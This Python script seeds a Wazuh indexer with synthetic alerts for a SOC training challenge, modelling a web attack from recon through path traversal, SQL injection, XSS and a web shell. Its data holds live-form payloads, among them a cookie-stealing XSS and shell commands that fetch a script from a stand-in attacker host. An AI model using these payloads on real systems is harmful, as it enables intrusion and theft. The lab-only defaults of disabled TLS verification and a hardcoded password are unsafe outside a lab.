#!/usr/bin/env python3
"""
SOC Lab - Challenge 1 : Web Attack dataset seeder.

Generates a coherent, analyzable web-attack kill chain and bulk-loads it into
the Wazuh indexer so students can hunt it in the Wazuh dashboard
(Discover / Threat Hunting, index pattern `wazuh-alerts-*`).

No third-party dependencies - standard library only.

Scenario (see docs/INSTRUCTOR_NOTES.md for the full answer key):
  A public nginx web server (agent `web-server-01`) is targeted by an
  attacker at 203.0.113.77 who moves through:
    recon / forced-browsing -> path traversal -> SQL injection ->
    XSS -> web-shell upload -> remote command execution (compromise).
  Background: legitimate traffic + a noisy red-herring scanner (203.0.113.9).
"""

import base64
import json
import os
import random
import ssl
import sys
import time
import urllib.error
import urllib.request
from datetime import datetime, timedelta, timezone

INDEXER_URL = os.environ.get("INDEXER_URL", "https://wazuh.indexer:9200").rstrip("/")
USERNAME = os.environ.get("INDEXER_USERNAME", "admin")
PASSWORD = os.environ.get("INDEXER_PASSWORD", "SecretPassword")
WAIT_FOR_TEMPLATE = os.environ.get("WAIT_FOR_TEMPLATE", "true").lower() == "true"
MARKER_INDEX = "soc-lab-seed-marker"

random.seed(1337)  # deterministic dataset across rebuilds

_CTX = ssl.create_default_context()
_CTX.check_hostname = False
_CTX.verify_mode = ssl.CERT_NONE

_AUTH = "Basic " + base64.b64encode(f"{USERNAME}:{PASSWORD}".encode()).decode()


def req(method, path, body=None, ctype="application/json"):
    """Minimal authenticated request helper. Returns (status, text)."""
    url = INDEXER_URL + path
    if body is None:
        data = None
    elif isinstance(body, (str, bytes)):
        data = body.encode() if isinstance(body, str) else body
    else:
        data = json.dumps(body).encode()
    r = urllib.request.Request(url, data=data, method=method)
    r.add_header("Authorization", _AUTH)
    if data is not None:
        r.add_header("Content-Type", ctype)
    try:
        with urllib.request.urlopen(r, context=_CTX, timeout=120) as resp:
            return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")


def wait_for_indexer(timeout=900):
    print(f"[*] Waiting for Wazuh indexer at {INDEXER_URL} ...", flush=True)
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            status, text = req("GET", "/_cluster/health")
            if status == 200 and '"status"' in text:
                health = json.loads(text).get("status")
                if health in ("yellow", "green"):
                    print(f"[+] Indexer is up (cluster status: {health}).", flush=True)
                    return True
                print(f"    cluster status={health}, waiting...", flush=True)
        except Exception as e:  # noqa: BLE001 - connectivity not ready yet
            print(f"    not ready yet ({e.__class__.__name__}), retrying...", flush=True)
        time.sleep(5)
    print("[!] Timed out waiting for the indexer.", file=sys.stderr)
    return False


def wait_for_template(timeout=300):
    """Best-effort wait for the `wazuh` index template so alerts map cleanly."""
    if not WAIT_FOR_TEMPLATE:
        return
    print("[*] Waiting for the Wazuh index template (best effort) ...", flush=True)
    deadline = time.time() + timeout
    while time.time() < deadline:
        for ep in ("/_index_template/wazuh", "/_template/wazuh"):
            status, _ = req("GET", ep)
            if status == 200:
                print("[+] Wazuh index template is present.", flush=True)
                return
        time.sleep(5)
    print("[i] Template not found in time - continuing with dynamic mapping "
          "(Discover will still work).", flush=True)


def already_seeded():
    status, _ = req("GET", f"/{MARKER_INDEX}/_doc/1")
    return status == 200


def mark_seeded(count):
    req("PUT", f"/{MARKER_INDEX}/_doc/1?refresh=true", {
        "seeded_at": datetime.now(timezone.utc).isoformat(),
        "document_count": count,
        "scenario": "challenge-1-web-attacks",
    })


# --------------------------------------------------------------------------- #
#  Scenario building blocks
# --------------------------------------------------------------------------- #

AGENT = {"id": "001", "name": "web-server-01", "ip": "10.0.0.50"}
MANAGER = {"name": "wazuh.manager"}
CLUSTER = {"name": "wazuh", "node": "node01"}
LOCATION = "/var/log/nginx/access.log"
DECODER = {"name": "web-accesslog"}

ATTACKER = "203.0.113.77"           # primary adversary (documentation range)
SCANNER = "203.0.113.9"             # red-herring noisy scanner
LEGIT_IPS = ["198.51.100.23", "198.51.100.45", "198.51.100.88", "198.51.100.101"]

GEO = {
    ATTACKER: {"country_name": "Netherlands", "city_name": "Amsterdam", "region_name": "North Holland"},
    SCANNER: {"country_name": "Russia", "city_name": "Moscow", "region_name": "Moscow"},
    "198.51.100.23": {"country_name": "United States", "city_name": "Ashburn", "region_name": "Virginia"},
    "198.51.100.45": {"country_name": "United States", "city_name": "Dallas", "region_name": "Texas"},
    "198.51.100.88": {"country_name": "Germany", "city_name": "Frankfurt", "region_name": "Hesse"},
    "198.51.100.101": {"country_name": "United Kingdom", "city_name": "London", "region_name": "England"},
}

UA_SQLMAP = "sqlmap/1.7.11#stable (https://sqlmap.org)"
UA_NIKTO = "Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:Port Check)"
UA_BROWSER = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
              "(KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36")
UA_CURL = "curl/8.5.0"

NOW = datetime.now(timezone.utc)


def mkalert(dt, rule, data, full_log, firedtimes=1, mitre=None, extra_groups=None):
    groups = ["web", "accesslog", "attack"] + (extra_groups or [])
    rule_obj = {
        "id": str(rule["id"]),
        "level": rule["level"],
        "description": rule["description"],
        "groups": sorted(set(groups)),
        "firedtimes": firedtimes,
        "mail": rule["level"] >= 12,
    }
    if mitre:
        rule_obj["mitre"] = mitre
    ts = dt.strftime("%Y-%m-%dT%H:%M:%S.") + f"{dt.microsecond // 1000:03d}+0000"
    return {
        "timestamp": ts,
        "@timestamp": ts,
        "rule": rule_obj,
        "agent": AGENT,
        "manager": MANAGER,
        "cluster": CLUSTER,
        "decoder": DECODER,
        "location": LOCATION,
        "input": {"type": "log"},
        "data": data,
        "GeoLocation": GEO.get(data.get("srcip"), {}),
        "full_log": full_log,
    }


def nginx_log(srcip, method, url, status, size, ua, referer="-"):
    tstr = "{:%d/%b/%Y:%H:%M:%S} +0000".format(_log_dt)
    return f'{srcip} - - [{tstr}] "{method} {url} HTTP/1.1" {status} {size} "{referer}" "{ua}"'


_log_dt = NOW  # updated per-event by builders below


def event(dt, srcip, method, url, status, size, ua, rule, mitre=None,
          firedtimes=1, extra_groups=None):
    global _log_dt
    _log_dt = dt
    data = {"protocol": method, "srcip": srcip, "id": str(status), "url": url}
    full_log = nginx_log(srcip, method, url, status, size, ua)
    return mkalert(dt, rule, data, full_log, firedtimes=firedtimes,
                   mitre=mitre, extra_groups=extra_groups)


# Rule catalogue (Wazuh web ruleset)
R_SCAN = {"id": 31101, "level": 5, "description": "Web server 400 error code."}
R_MULTISCAN = {"id": 31151, "level": 10,
               "description": "Multiple web server 400 error codes from same source IP."}
R_TRAVERSAL = {"id": 31104, "level": 6, "description": "Common web attack."}
R_SQLI = {"id": 31103, "level": 7, "description": "SQL injection attempt."}
R_XSS = {"id": 31105, "level": 6, "description": "XSS (Cross Site Scripting) attempt."}
R_WEBSHELL = {"id": 31166, "level": 12,
              "description": "Web server attack - possible web shell / command execution."}

M_EXPLOIT = {"id": ["T1190"], "tactic": ["Initial Access"],
             "technique": ["Exploit Public-Facing Application"]}
M_DISCOVERY = {"id": ["T1083"], "tactic": ["Discovery"],
               "technique": ["File and Directory Discovery"]}
M_WEBSHELL = {"id": ["T1505.003"], "tactic": ["Persistence"],
              "technique": ["Server Software Component: Web Shell"]}


def build_dataset():
    docs = []

    # --- Phase 0: benign 404 background noise across the last 24h -----------
    # Legitimate users also generate the odd 404 (missing favicon, moved pages).
    # Teaches triage: not every 404 is an attack.
    benign_404s = ["/favicon.ico", "/robots.txt", "/old-promo.html",
                   "/images/banner-2023.png", "/apple-touch-icon.png"]
    for _ in range(18):
        dt = NOW - timedelta(seconds=random.randint(0, 24 * 3600))
        ip = random.choice(LEGIT_IPS)
        url = random.choice(benign_404s)
        docs.append(event(dt, ip, "GET", url, 404, 153, UA_BROWSER, R_SCAN))

    # --- Phase 1: recon / forced browsing (18h ago, ~6 min burst) -----------
    recon_start = NOW - timedelta(hours=18)
    recon_paths = ["/admin", "/administrator", "/wp-login.php", "/wp-admin/",
                   "/phpmyadmin/", "/.env", "/.git/config", "/config.php.bak",
                   "/backup.zip", "/server-status", "/.htaccess", "/shell.php",
                   "/cgi-bin/", "/api/v1/users", "/console", "/manager/html"]
    fired = 0
    for i in range(120):
        dt = recon_start + timedelta(seconds=i * random.uniform(1, 4))
        path = random.choice(recon_paths)
        fired += 1
        # every ~12th hit escalates into the correlation rule 31151
        if fired % 12 == 0:
            docs.append(event(dt, ATTACKER, "GET", path, 404, 162, UA_NIKTO,
                              R_MULTISCAN, firedtimes=fired, extra_groups=["web_scan"]))
        else:
            docs.append(event(dt, ATTACKER, "GET", path, 404, 162, UA_NIKTO,
                              R_SCAN, firedtimes=fired, extra_groups=["web_scan"]))

    # red-herring scanner - recon only, never escalates (distractor)
    for i in range(45):
        dt = NOW - timedelta(hours=random.uniform(2, 22)) + timedelta(seconds=i)
        path = random.choice(recon_paths)
        docs.append(event(dt, SCANNER, "GET", path, 404, 162, UA_NIKTO,
                          R_SCAN, extra_groups=["web_scan"]))

    # --- Phase 2: path traversal (17h ago) ----------------------------------
    trav_start = NOW - timedelta(hours=17)
    traversals = [
        "/download.php?file=../../../../etc/passwd",
        "/download.php?file=../../../../etc/shadow",
        "/download.php?file=..%2f..%2f..%2f..%2fetc%2fpasswd",
        "/view.php?page=../../../../var/log/nginx/access.log",
        "/download.php?file=....//....//....//etc/hosts",
    ]
    for i in range(22):
        dt = trav_start + timedelta(seconds=i * random.uniform(3, 9))
        url = random.choice(traversals)
        status = 200 if "etc/passwd" in url and i == 3 else random.choice([403, 403, 400])
        docs.append(event(dt, ATTACKER, "GET", url, status, 2048 if status == 200 else 571,
                          UA_CURL, R_TRAVERSAL, mitre=M_DISCOVERY))

    # --- Phase 3: SQL injection (16h ago, sqlmap) ----------------------------
    sqli_start = NOW - timedelta(hours=16)
    injections = [
        "/products.php?id=1'",
        "/products.php?id=1' OR '1'='1",
        "/products.php?id=1 AND 1=1-- -",
        "/products.php?id=1 UNION SELECT null,username,password FROM users-- -",
        "/products.php?id=1 UNION SELECT null,table_name,null FROM information_schema.tables-- -",
        "/login.php?user=admin'--&pass=x",
        "/products.php?id=1;WAITFOR DELAY '0:0:5'--",
        "/products.php?id=1' AND SLEEP(5)-- -",
    ]
    for i in range(44):
        dt = sqli_start + timedelta(seconds=i * random.uniform(1, 3))
        url = random.choice(injections)
        # the UNION dump returns 200 (successful extraction) a few times
        status = 200 if "UNION SELECT null,username" in url and i % 7 == 0 else 200 if random.random() < 0.3 else 500
        size = random.randint(4000, 15000) if status == 200 else 712
        docs.append(event(dt, ATTACKER, "GET", url, status, size, UA_SQLMAP,
                          R_SQLI, mitre=M_EXPLOIT, extra_groups=["sql_injection"],
                          firedtimes=i + 1))

    # --- Phase 4: XSS (15h ago) ----------------------------------------------
    xss_start = NOW - timedelta(hours=15)
    payloads = [
        "/search.php?q=<script>alert(1)</script>",
        "/search.php?q=<img src=x onerror=alert(document.cookie)>",
        "/comment.php?text=<svg/onload=fetch('//203.0.113.77/c?'+document.cookie)>",
        "/search.php?q=%3Cscript%3Edocument.location='//203.0.113.77'%3C/script%3E",
    ]
    for i in range(20):
        dt = xss_start + timedelta(seconds=i * random.uniform(4, 12))
        url = random.choice(payloads)
        docs.append(event(dt, ATTACKER, "GET", url, 200, random.randint(1500, 3000),
                          UA_BROWSER, R_XSS, mitre=M_EXPLOIT))

    # --- Phase 5: web-shell upload + remote command execution (compromise) ---
    shell_start = NOW - timedelta(hours=14)
    # the upload POST succeeds (200) - vulnerable upload endpoint
    docs.append(event(shell_start, ATTACKER, "POST", "/uploads/avatar_upload.php",
                      200, 54, UA_CURL, R_WEBSHELL, mitre=M_WEBSHELL,
                      firedtimes=1, extra_groups=["web_shell"]))
    # subsequent command execution through the planted shell
    cmds = ["id", "whoami", "uname%20-a", "cat%20/etc/passwd", "ls%20-la%20/var/www",
            "cat%20/var/www/html/config.php", "wget%20http://203.0.113.77/m.sh%20-O%20/tmp/m.sh",
            "curl%20-s%20http://203.0.113.77/beacon"]
    for i, c in enumerate(cmds, start=2):
        dt = shell_start + timedelta(seconds=i * random.uniform(20, 90))
        url = f"/uploads/shell.php?cmd={c}"
        docs.append(event(dt, ATTACKER, "GET", url, 200, random.randint(60, 2200),
                          UA_CURL, R_WEBSHELL, mitre=M_WEBSHELL, firedtimes=i,
                          extra_groups=["web_shell"]))

    docs.sort(key=lambda d: d["timestamp"])
    return docs


def bulk_index(docs, chunk=500):
    total = 0
    for start in range(0, len(docs), chunk):
        batch = docs[start:start + chunk]
        lines = []
        for d in batch:
            dt = datetime.strptime(d["timestamp"][:10], "%Y-%m-%d")
            index = "wazuh-alerts-4.x-" + dt.strftime("%Y.%m.%d")
            lines.append(json.dumps({"index": {"_index": index}}))
            lines.append(json.dumps(d))
        payload = "\n".join(lines) + "\n"
        status, text = req("POST", "/_bulk?refresh=true", payload, ctype="application/x-ndjson")
        if status >= 300:
            print(f"[!] Bulk request failed ({status}): {text[:400]}", file=sys.stderr)
            sys.exit(1)
        result = json.loads(text)
        if result.get("errors"):
            # surface the first item error for debugging
            for item in result["items"]:
                op = item.get("index", {})
                if op.get("status", 200) >= 300:
                    print(f"[!] Index error: {json.dumps(op.get('error'))[:400]}", file=sys.stderr)
                    sys.exit(1)
        total += len(batch)
        print(f"    indexed {total}/{len(docs)} alerts", flush=True)
    return total


def main():
    if not wait_for_indexer():
        sys.exit(1)
    if already_seeded():
        print("[=] Dataset already seeded (marker found). Nothing to do.", flush=True)
        return
    wait_for_template()
    print("[*] Generating web-attack dataset ...", flush=True)
    docs = build_dataset()
    print(f"[*] Loading {len(docs)} alerts into the Wazuh indexer ...", flush=True)
    total = bulk_index(docs)
    mark_seeded(total)
    print(f"[+] Done. {total} alerts loaded. Open the dashboard and explore "
          f"index pattern `wazuh-alerts-*`.", flush=True)


if __name__ == "__main__":
    main()
